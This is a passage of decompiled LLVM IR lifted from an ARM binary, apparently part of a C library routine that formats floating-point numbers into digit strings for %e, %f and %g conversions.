  br i1 %v2_162f0, label %dec_label_pc_16338, label %dec_label_pc_16304

dec_label_pc_16304:                               ; preds = %dec_label_pc_162e0
  %v8_16308 = bitcast i64 %v3_16338 to double
  %v9_16308 = fmul double %v2_1633c, %v8_16308
  %v10_16308 = fptrunc double %v9_16308 to float
  %v11_16308 = bitcast float %v10_16308 to i32
  store i32 %v11_16308, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_16308, i32* %r7.global-to-local, align 4
  store i32 %v0_162f8, i32* %r8.global-to-local, align 4
  %v4_1631c = call i32 @__aeabi_dcmplt(i32 %v11_16308, i32 %v0_162f8, i32 0, i32 1104006501)
  store i32 %v4_1631c, i32* %r0.global-to-local, align 4
  %v2_16320 = icmp eq i32 %v4_1631c, 0
  store i1 %v2_16320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16320, label %dec_label_pc_16378, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_16304
  %v1_16328 = load i32, i32* %r4.global-to-local, align 4
  %v3_16328 = sub i32 %v2_16328, %v1_16328
  store i32 %v3_16328, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16370

dec_label_pc_16338:                               ; preds = %dec_label_pc_162e0
  store i32 %v0_162f8, i32* @r1, align 4
  %v8_16344 = bitcast i64 %v3_16338 to double
  %v9_16344 = fdiv double %v2_1633c, %v8_16344
  %v10_16344 = fptrunc double %v9_16344 to float
  %v11_16344 = bitcast float %v10_16344 to i32
  store i32 %v11_16344, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_16344, i32* %r7.global-to-local, align 4
  store i32 %v0_162f8, i32* %r8.global-to-local, align 4
  %v4_16358 = call i32 @__aeabi_dcmpge(i32 %v11_16344, i32 %v0_162f8, i32 0, i32 1100470148)
  store i32 %v4_16358, i32* %r0.global-to-local, align 4
  %v2_1635c = icmp eq i32 %v4_16358, 0
  store i1 %v2_1635c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1635c, label %dec_label_pc_16378, label %dec_label_pc_16364

dec_label_pc_16364:                               ; preds = %dec_label_pc_16338
  %v1_16368 = load i32, i32* %r4.global-to-local, align 4
  %v2_16368 = add i32 %v1_16368, %v2_16328
  store i32 %v2_16368, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16370

dec_label_pc_16370:                               ; preds = %.thread11, %dec_label_pc_16364
  %stack_var_-192.2 = phi i32 [ %v2_16368, %dec_label_pc_16364 ], [ %v3_16328, %.thread11 ]
  %v0_16370 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16370, i32* %r5.global-to-local, align 4
  %v0_16374 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16374, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16378

dec_label_pc_16378:                               ; preds = %dec_label_pc_16304, %dec_label_pc_16338, %dec_label_pc_16370
  %stack_var_-192.3 = phi i32 [ %v2_16328, %dec_label_pc_16338 ], [ %stack_var_-192.2, %dec_label_pc_16370 ], [ %v2_16328, %dec_label_pc_16304 ]
  %v0_16378 = load i32, i32* %sl.global-to-local, align 4
  %v2_16378 = icmp eq i32 %v0_16378, 0
  store i1 %v2_16378, i1* %cpsr_z.global-to-local, align 1
  %v0_1637c = load i32, i32* %r4.global-to-local, align 4
  %v3_1637c = sdiv i32 %v0_1637c, 2
  store i32 %v3_1637c, i32* %r4.global-to-local, align 4
  br i1 %v2_16378, label %dec_label_pc_16384, label %dec_label_pc_16378.dec_label_pc_162e0_crit_edge

dec_label_pc_16378.dec_label_pc_162e0_crit_edge:  ; preds = %dec_label_pc_16378
  %v2_162e8.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_162e0

dec_label_pc_16384:                               ; preds = %dec_label_pc_16378
  %v0_16384 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16384, i32* @r0, align 4
  %v0_16388 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16388, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_16394 = call i32 @__aeabi_dcmpge(i32 %v0_16384, i32 %v0_16388, i32 0, i32 1104006501)
  store i32 %v6_16394, i32* %r0.global-to-local, align 4
  %v2_16398 = icmp eq i32 %v6_16394, 0
  store i1 %v2_16398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16398, label %dec_label_pc_163c8, label %dec_label_pc_163a0

dec_label_pc_163a0:                               ; preds = %dec_label_pc_16384
  %v0_163a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_163a0 = sext i32 %v0_163a0 to i64
  %v2_163a0 = bitcast i64 %v1_163a0 to double
  %v0_163a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_163a4, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_163b0 = fdiv double %v2_163a0, 0.000000e+00
  %v10_163b0 = fptrunc double %v9_163b0 to float
  %v11_163b0 = bitcast float %v10_163b0 to i32
  store i32 %v11_163b0, i32* %r0.global-to-local, align 4
  store i32 %v11_163b0, i32* %r5.global-to-local, align 4
  %v1_163c0 = add i32 %stack_var_-192.3, 1
  store i32 %v1_163c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_163c8

dec_label_pc_163c8:                               ; preds = %dec_label_pc_163a0, %bb208, %dec_label_pc_16384, %dec_label_pc_161e8
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_16384 ], [ -1, %dec_label_pc_161e8 ], [ -1, %bb208 ], [ %v1_163c0, %dec_label_pc_163a0 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_163cc = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_163cc, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %dec_label_pc_16448, %dec_label_pc_163c8
  %v0_163d0 = load i32, i32* %r6.global-to-local, align 4
  %v0_163d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_163d8 = sext i32 %v0_163d4 to i64
  %v2_163d8 = bitcast i64 %v1_163d8 to double
  %v3_163d8 = fptoui double %v2_163d8 to i32
  store i32 %v3_163d8, i32* %r8.global-to-local, align 4
  store i32 %v3_163d8, i32* %r2.global-to-local, align 4
  store i32 %v0_163d0, i32* %r3.global-to-local, align 4
  store i32 %v0_163d4, i32* @r0, align 4
  store i32 %v0_163d0, i32* %r1.global-to-local, align 4
  %v6_163f4 = call i32 @__aeabi_dsub(i32 %v0_163d4, i32 %v0_163d0, i32 %v3_163d8, i32 %v0_163d0)
  %v7_163f4 = sext i32 %v6_163f4 to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_16400 = bitcast i64 %v7_163f4 to double
  %v9_16400 = fmul double %v3_16400, 0.000000e+00
  %v10_16400 = fptrunc double %v9_16400 to float
  %v11_16400 = bitcast float %v10_16400 to i32
  store i32 %v11_16400, i32* %r0.global-to-local, align 4
  %v0_16404 = load i32, i32* %sl.global-to-local, align 4
  %v1_16404 = add i32 %v0_16404, 9
  store i32 %v1_16404, i32* %sl.global-to-local, align 4
  store i32 %v11_16400, i32* %r5.global-to-local, align 4
  store i32 %v0_163d0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_16414.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16414

dec_label_pc_16414:                               ; preds = %dec_label_pc_16414.dec_label_pc_16414_crit_edge, %dec_label_pc_163d0
  %v1_16428 = phi i32 [ %v1_16428.pre, %dec_label_pc_16414.dec_label_pc_16414_crit_edge ], [ %v1_16404, %dec_label_pc_163d0 ]
  %v0_16420 = phi i32 [ %v0_1643c, %dec_label_pc_16414.dec_label_pc_16414_crit_edge ], [ 0, %dec_label_pc_163d0 ]
  %v0_1642c = phi i32 [ %v2_16438, %dec_label_pc_16414.dec_label_pc_16414_crit_edge ], [ %v0_16414.pre, %dec_label_pc_163d0 ]
  %v3_1641c = urem i32 %v0_1642c, 10
  %v1_16420 = add i32 %v0_16420, 1
  store i32 %v1_16420, i32* %r7.global-to-local, align 4
  %v1_16424 = or i32 %v3_1641c, 48
  store i32 %v1_16424, i32* %r2.global-to-local, align 4
  %v2_16428 = sub i32 %v1_16428, %v1_16420
  store i32 %v2_16428, i32* %r3.global-to-local, align 4
  store i32 %v0_1642c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_16434 = trunc i32 %v1_16424 to i8
  %v3_16434 = inttoptr i32 %v2_16428 to i8*
  store i8 %v1_16434, i8* %v3_16434, align 1
  %v0_16438 = load i32, i32* %r0.global-to-local, align 4
  %v1_16438 = load i32, i32* %r1.global-to-local, align 4
  %v2_16438 = udiv i32 %v0_16438, %v1_16438
  store i32 %v2_16438, i32* %r0.global-to-local, align 4
  %v0_1643c = load i32, i32* %r7.global-to-local, align 4
  %v7_1643c = icmp eq i32 %v0_1643c, 8
  store i1 %v7_1643c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16438, i32* %r8.global-to-local, align 4
  %v7_16444 = icmp slt i32 %v0_1643c, 9
  br i1 %v7_16444, label %dec_label_pc_16414.dec_label_pc_16414_crit_edge, label %dec_label_pc_16448

dec_label_pc_16414.dec_label_pc_16414_crit_edge:  ; preds = %dec_label_pc_16414
  %v1_16428.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16414

dec_label_pc_16448:                               ; preds = %dec_label_pc_16414
  %v0_16448 = load i32, i32* %r4.global-to-local, align 4
  %v1_16448 = add i32 %v0_16448, 1
  store i32 %v1_16448, i32* %r4.global-to-local, align 4
  %v7_1644c = icmp eq i32 %v0_16448, 0
  store i1 %v7_1644c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1644c, label %dec_label_pc_163d0, label %dec_label_pc_16454

dec_label_pc_16454:                               ; preds = %dec_label_pc_16448
  %v0_16454 = load i32, i32* %sb.global-to-local, align 4
  %v7_16454 = icmp eq i32 %v0_16454, 96
  store i1 %v7_16454, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_16454, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_16454
  %v5_16464 = add i32 %v0_16454, 32
  store i32 %v5_16464, i32* %r3.global-to-local, align 4
  %v5_16468 = urem i32 %v5_16464, 256
  store i32 %v5_16468, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_16454
  %v4_16460.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_16460.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_16460126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_16488 = phi i32 [ %v0_16454, %thread-pre-split ], [ %v5_16468, %bb213 ]
  %v7_1646c = icmp eq i32 %v0_16488, 103
  %. = zext i1 %v7_1646c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_16478 = load i32, i32* %fp.global-to-local, align 4
  %v2_16478 = icmp eq i32 %v0_16478, 0
  store i1 %v2_16478, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_16478, 1
  br i1 %tmp217, label %.thread17, label %bb218

.thread17:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_16480 = icmp eq i1 %v7_1646c, false
  store i1 %v2_16480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16480, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_16484 = add i32 %v0_16478, -1
  store i32 %v2_16484, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread17, %bb218, %bb219
  %v0_16498 = phi i32 [ %v0_16478, %.thread17 ], [ %v0_16478, %bb218 ], [ %v2_16484, %bb219 ]
  %v7_16488 = icmp eq i32 %v0_16488, 102
  store i1 %v7_16488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16488, label %dec_label_pc_16494, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_16498, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_164bc

dec_label_pc_16494:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_16498 = add i32 %v0_16498, %stack_var_-192.4
  store i32 %v2_16498, i32* %ip.global-to-local, align 4
  %v8_1649c = icmp eq i32 %v2_16498, -1
  store i1 %v8_1649c, i1* %cpsr_z.global-to-local, align 1
  %v6_164a0 = icmp slt i32 %v2_16498, -1
  br i1 %v6_164a0, label %dec_label_pc_164a4, label %dec_label_pc_164bc

dec_label_pc_164a4:                               ; preds = %dec_label_pc_16494
  %v2_164a4 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_164a4, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_164b0 = bitcast i32* %stack_var_-83 to i8*
  %v3_164b0 = call i32 @__GI_memset(i8* %v2_164b0, i32 48)
  store i32 %v3_164b0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_164bc

dec_label_pc_164bc:                               ; preds = %bb221, %dec_label_pc_16494, %dec_label_pc_164a4
  %v1_1650092 = phi i32 [ %v3_164b0, %dec_label_pc_164a4 ], [ %v2_16438, %dec_label_pc_16494 ], [ %v2_16438, %bb221 ]
  %v1_164e4 = phi i32 [ -1, %dec_label_pc_164a4 ], [ %v2_16498, %dec_label_pc_16494 ], [ %v0_16498, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_164a4 ], [ %stack_var_-192.4, %dec_label_pc_16494 ], [ %stack_var_-192.4, %bb221 ]
  %v1_164c0 = add i32 %v1_164e4, -16
  %v3_164c0 = sub i32 15, %v1_164e4
  %v4_164c0 = and i32 %v3_164c0, %v1_164e4
  %v5_164c0 = icmp slt i32 %v4_164c0, 0
  %v6_164c0 = icmp slt i32 %v1_164c0, 0
  %v7_164c0 = icmp eq i32 %v1_164e4, 16
  store i1 %v7_164c0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_164cc = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_164cc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_164d4 = xor i1 %v6_164c0, %v5_164c0
  %v4_164d4 = or i1 %v7_164c0, %v3_164d4
  br i1 %v4_164d4, label %dec_label_pc_164e0, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_164bc
  %v7_164d4137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_164d4137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_164e0:                               ; preds = %dec_label_pc_164bc
  %v2_164e0 = ptrtoint i32* %stack_var_-82 to i32
  %v2_164e4 = add i32 %v1_164e4, %v2_164e0
  store i32 %v2_164e4, i32* %r3.global-to-local, align 4
  %v1_164e8 = add i32 %v2_164e4, 2
  %v2_164e8 = inttoptr i32 %v1_164e8 to i8*
  %v3_164e8 = load i8, i8* %v2_164e8, align 1
  %v4_164e8 = zext i8 %v3_164e8 to i32
  store i32 %v4_164e8, i32* %r2.global-to-local, align 4
  store i32 %v1_164e8, i32* %r1.global-to-local, align 4
  %v2_164f0 = icmp ugt i8 %v3_164e8, 51
  %v7_164f0 = icmp eq i8 %v3_164e8, 52
  store i1 %v7_164f0, i1* %cpsr_z.global-to-local, align 1
  %v2_164f4 = xor i1 %v2_164f0, true
  %v3_164f4 = or i1 %v7_164f0, %v2_164f4
  br i1 %v3_164f4, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_164e0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_164e0, %bb222
  %v1_1650090 = phi i32 [ %v1_1650092, %dec_label_pc_164e0 ], [ 0, %bb222 ]
  %v2_164f8 = xor i1 %v7_164f0, true
  %v3_164f8 = and i1 %v2_164f0, %v2_164f8
  br i1 %v3_164f8, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_164fc = phi i32 [ %v0_164fc.pre, %._crit_edge87 ], [ %v7_164d4137141, %.thread140 ], [ %v1_164e8, %bb223 ], [ %v1_164e8, %bb224 ]
  %v1_16500 = phi i32 [ %v1_16500.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_1650090, %bb223 ], [ 1, %bb224 ]
  %v1_164fc = add i32 %v0_164fc, -1
  %v2_164fc = inttoptr i32 %v1_164fc to i8*
  %v3_164fc = load i8, i8* %v2_164fc, align 1
  %v4_164fc = zext i8 %v3_164fc to i32
  store i32 %v1_164fc, i32* %r1.global-to-local, align 4
  %v2_16500 = add i32 %v4_164fc, %v1_16500
  %v1_16504 = urem i32 %v2_16500, 256
  store i32 %v1_16504, i32* %r3.global-to-local, align 4
  %v2_16508 = icmp ugt i32 %v1_16504, 56
  %v7_16508 = icmp eq i32 %v1_16504, 57
  store i1 %v7_16508, i1* %cpsr_z.global-to-local, align 1
  %v2_1650c = xor i1 %v2_16508, true
  %v3_1650c = or i1 %v7_16508, %v2_1650c
  br i1 %v3_1650c, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_16510 = xor i1 %v7_16508, true
  %v3_16510 = and i1 %v2_16508, %v2_16510
  br i1 %v3_16510, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_16518.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_16518 = phi i32 [ %v1_16518.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_16514 = icmp eq i32 %v1_16504, 48
  store i1 %v7_16514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16514, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_16518 = or i32 %v1_16518, 1
  store i32 %v2_16518, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_1651c = phi i32 [ 1, %bb229 ], [ %v1_16518, %bb228 ]
  %v2_1651c = icmp eq i32 %v0_1651c, 0
  store i1 %v2_1651c, i1* %cpsr_z.global-to-local, align 1
  %v1_16520 = trunc i32 %v2_16500 to i8
  store i8 %v1_16520, i8* %v2_164fc, align 1
  %v0_16524 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16524, label %dec_label_pc_16528, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_16500.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_164fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_16528:                               ; preds = %._crit_edge93
  store i32 %v2_164cc, i32* %r2.global-to-local, align 4
  %v2_1652c = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_1652c, i32* %r3.global-to-local, align 4
  %v0_16530 = load i32, i32* %r1.global-to-local, align 4
  %v3_16530 = icmp uge i32 %v0_16530, %v2_1652c
  %v9_16530 = icmp eq i32 %v0_16530, %v2_1652c
  store i1 %v9_16530, i1* %cpsr_z.global-to-local, align 1
  %v2_16534 = xor i1 %v3_16530, true
  %v3_16534 = or i1 %v9_16530, %v2_16534
  br i1 %v3_16534, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_16528
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_1652c, i32* %r2.global-to-local, align 4
  store i32 %v2_1652c, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_16528, %bb230
  %v2_16554 = phi i32 [ %v2_1652c, %bb230 ], [ %v0_16530, %dec_label_pc_16528 ]
  %v4_16548144 = phi i32 [ %v2_1652c, %bb230 ], [ %v2_164cc, %dec_label_pc_16528 ]
  %v2_16540 = xor i1 %v9_16530, true
  %v3_16540 = and i1 %v3_16530, %v2_16540
  br i1 %v3_16540, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_16534, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_16544 = load i32, i32* @lr, align 4
  %v5_16544 = add i32 %v4_16544, 1
  store i32 %v5_16544, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_16540, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_16548 = add i32 %v4_16548144, 2
  store i32 %v5_16548, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16550 = load i32, i32* %sb.global-to-local, align 4
  %v7_16550 = icmp eq i32 %v0_16550, 103
  store i1 %v7_16550, i1* %cpsr_z.global-to-local, align 1
  %v3_16554 = add i32 %v2_16554, 1
  %v4_16554 = inttoptr i32 %v3_16554 to i8*
  store i8 0, i8* %v4_16554, align 1
  %v0_16558 = load i32, i32* %r1.global-to-local, align 4
  %v1_16558 = add i32 %v0_16558, 1
  store i32 %v1_16558, i32* %lr.global-to-local, align 4
  %v0_1655c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1655c, label %dec_label_pc_16560, label %dec_label_pc_16588

dec_label_pc_16560:                               ; preds = %bb236
  %v0_16560 = load i32, i32* %r0.global-to-local, align 4
  %v1_16560 = load i32, i32* %ip.global-to-local, align 4
  %v2_16560 = sub i32 %v0_16560, %v1_16560
  %v4_16560 = xor i32 %v1_16560, %v0_16560
  %v5_16560 = xor i32 %v2_16560, %v0_16560
  %v6_16560 = and i32 %v5_16560, %v4_16560
  %v7_16560 = icmp slt i32 %v6_16560, 0
  %v8_16560 = icmp slt i32 %v2_16560, 0
  %v9_16560 = icmp eq i32 %v0_16560, %v1_16560
  %v3_16564 = xor i1 %v8_16560, %v7_16560
  %v4_16564 = or i1 %v9_16560, %v3_16564
  %.258 = zext i1 %v4_16564 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_1656c = add i32 %v0_16560, 4
  %v3_1656c = sub i32 0, %v0_16560
  %v4_1656c = and i32 %v1_1656c, %v3_1656c
  %v5_1656c = icmp slt i32 %v4_1656c, 0
  %v6_1656c = icmp slt i32 %v1_1656c, 0
  %v7_1656c = icmp eq i32 %v1_1656c, 0
  store i1 %v7_1656c, i1* %cpsr_z.global-to-local, align 1
  %v2_16570 = xor i1 %v6_1656c, %v5_1656c
  br i1 %v2_16570, label %.thread22, label %bb239

.thread22:                                        ; preds = %dec_label_pc_16560
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_168a4

bb239:                                            ; preds = %dec_label_pc_16560
  %v2_16574 = icmp eq i1 %v4_16564, false
  store i1 %v2_16574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16574, label %dec_label_pc_168a4, label %.thread25

.thread25:                                        ; preds = %bb239
  %v3_16578 = sub i32 %v1_16560, %v0_16560
  store i32 %v3_16578, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16594

dec_label_pc_16588:                               ; preds = %bb236
  %v0_16588 = load i32, i32* %sb.global-to-local, align 4
  %v7_16588 = icmp eq i32 %v0_16588, 102
  store i1 %v7_16588, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_16588, i32* %r8.global-to-local, align 4
  br i1 %v7_16588, label %dec_label_pc_16588.dec_label_pc_16594_crit_edge, label %dec_label_pc_165a4

dec_label_pc_16588.dec_label_pc_16594_crit_edge:  ; preds = %dec_label_pc_16588
  %v0_16594.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16594

dec_label_pc_16594:                               ; preds = %.thread25, %dec_label_pc_16588.dec_label_pc_16594_crit_edge
  %v0_16594 = phi i32 [ %v0_16594.pre, %dec_label_pc_16588.dec_label_pc_16594_crit_edge ], [ %v0_16560, %.thread25 ]
  %v1_16594 = icmp slt i32 %v0_16594, 0
  %v2_16594 = icmp eq i32 %v0_16594, 0
  store i1 %v2_16594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16594, label %bb240, label %dec_label_pc_165a4

bb240:                                            ; preds = %dec_label_pc_16594
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_1659c = load i32, i32* %r2.global-to-local, align 4
  %v6_1659c = add i32 %v5_1659c, -1
  %v7_1659c = inttoptr i32 %v6_1659c to i8*
  store i8 48, i8* %v7_1659c, align 1
  %v8_1659c = load i32, i32* %r2.global-to-local, align 4
  %v9_1659c = add i32 %v8_1659c, -1
  store i32 %v9_1659c, i32* %r2.global-to-local, align 4
  %v0_165a0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_165d4.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_165a4

dec_label_pc_165a4:                               ; preds = %bb240, %dec_label_pc_16594, %dec_label_pc_168a4, %dec_label_pc_16588
  %v1_165d4 = phi i32 [ %v1_16558, %dec_label_pc_16588 ], [ %v1_16558, %dec_label_pc_168a4 ], [ %v1_165d4.pre.pre, %bb240 ], [ %v1_16558, %dec_label_pc_16594 ]
  %v1_1664c31 = phi i32 [ 0, %dec_label_pc_16588 ], [ 0, %dec_label_pc_168a4 ], [ %v0_165a0.pre, %bb240 ], [ %v0_16594, %dec_label_pc_16594 ]
  store i32 %v1_1664c31, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_165b0 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_165b0, i32* %r3.global-to-local, align 4
  %v0_165bc = load i32, i32* %r2.global-to-local, align 4
  %v1_165bc = inttoptr i32 %v0_165bc to i8*
  %v2_165bc = load i8, i8* %v1_165bc, align 1
  %v3_165bc = zext i8 %v2_165bc to i32
  store i32 %v3_165bc, i32* %r3.global-to-local, align 4
  %v5_165bc = add i32 %v0_165bc, 1
  store i32 %v5_165bc, i32* %r2.global-to-local, align 4
  %v1_165c0 = icmp slt i32 %v1_1664c31, 0
  %v2_165c0 = icmp eq i32 %v1_1664c31, 0
  store i1 %v2_165c0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_165bc, i32* %r6.global-to-local, align 4
  store i32 %v3_165bc, i32* %stack_var_-42, align 4
  %v2_165d4 = sub i32 %v1_165d4, %v5_165bc
  store i32 %v2_165d4, i32* %ip.global-to-local, align 4
  br i1 %v1_165c0, label %.thread, label %dec_label_pc_165e0

.thread:                                          ; preds = %dec_label_pc_165a4
  %v5_165d8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_165d8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1665c

dec_label_pc_165e0:                               ; preds = %dec_label_pc_165a4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_165e4 = sub i32 %v1_1664c31, %v2_165d4
  %v4_165e4 = xor i32 %v2_165d4, %v1_1664c31
  %v5_165e4 = xor i32 %v2_165e4, %v1_1664c31
  %v6_165e4 = and i32 %v5_165e4, %v4_165e4
  %v7_165e4 = icmp slt i32 %v6_165e4, 0
  %v8_165e4 = icmp slt i32 %v2_165e4, 0
  %v9_165e4 = icmp eq i32 %v1_1664c31, %v2_165d4
  store i1 %v9_165e4, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_165f0 = xor i1 %v8_165e4, %v7_165e4
  br i1 %v2_165f0, label %dec_label_pc_1663c, label %dec_label_pc_165f4

dec_label_pc_165f4:                               ; preds = %dec_label_pc_165e0
  store i32 %v2_165e4, i32* %r2.global-to-local, align 4
  %v2_165f8 = icmp eq i32 %v2_165e4, 0
  store i1 %v2_165f8, i1* %cpsr_z.global-to-local, align 1
  %v2_165fc = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_165fc, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_165e4, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_16610

.thread148:                                       ; preds = %dec_label_pc_165f4
  %v7_16604 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_16604, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread35

dec_label_pc_16610:                               ; preds = %dec_label_pc_165f4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34237), i32* %r3.global-to-local, align 4
  %v2_16620 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_16620, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
